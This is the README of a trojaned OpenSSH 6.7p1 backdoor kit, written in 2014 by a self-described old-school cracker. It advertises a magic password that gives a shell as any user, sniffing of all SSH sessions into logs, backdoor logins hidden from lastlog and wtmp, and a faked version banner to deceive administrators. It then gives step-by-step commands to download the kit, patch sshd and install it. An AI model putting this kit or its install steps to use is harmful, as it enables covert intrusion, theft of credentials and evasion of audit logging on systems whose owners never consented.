bl0wsshd00r67p1
===============

OpenSSH 6.7p1 trojan backdoor kit

# - brazilian oldschool never dies.
# coded by bl0w. bl0w@koresec.org - 2014 -
# greetz rfs r47 bonny mayhem all IRC #darknet@efnet and #offset@brasnet-efnet old school members.


### Features.
### 1. MAGIC PASSWORD TO GET SHELL WITH ANY USER (ENCRYPTED OR NO)
### 2, SNIFFS ALL IN/OUT FROM SSH/SSHD, LOG FILE ENCRYPTED OR NO.
### 3. YOU CAN CHOSE DIRECTORY OF LOG DECRYPTOR AND DIRECTORY OF SNIFF-LOGS.
### 4. All connections accepted by backdoor wont logged by lastlog/wtmp/udp.
### 5. Simple setup, just setup.sh!
### 6. FAKE BANNER and fake version, if admin do ssh -V or sshd -V banner will be faked! :~
#Enjoy!

#HOWTO INSTALL.

$ wget http://www.mirrorservice.org/pub/OpenBSD/OpenSSH/portable/openssh-6.7p1.tar.gz
$ tar -xzvf openssh-6.7p1.tar.gz
$ cd openssh-6.7p1
$ wget www.koresec.org/bl0wsshd00r67p1.tar.gz (Download bl0wsshd00r67p1 from your favorite host! :D)
$ tar -xzvf bl0wsshd00r67p1.tar.gz

** NOTE ** COPY ALL FILES FROM bl0wd00r67p1/ to openssh-6.7p1 directory before execute setup.sh!

$ cp bl0wsshd00r67p1/* ./
$ patch -p1 < backdoor.patch
$ sh setup.sh

Follow instructions, its very easy ! :D
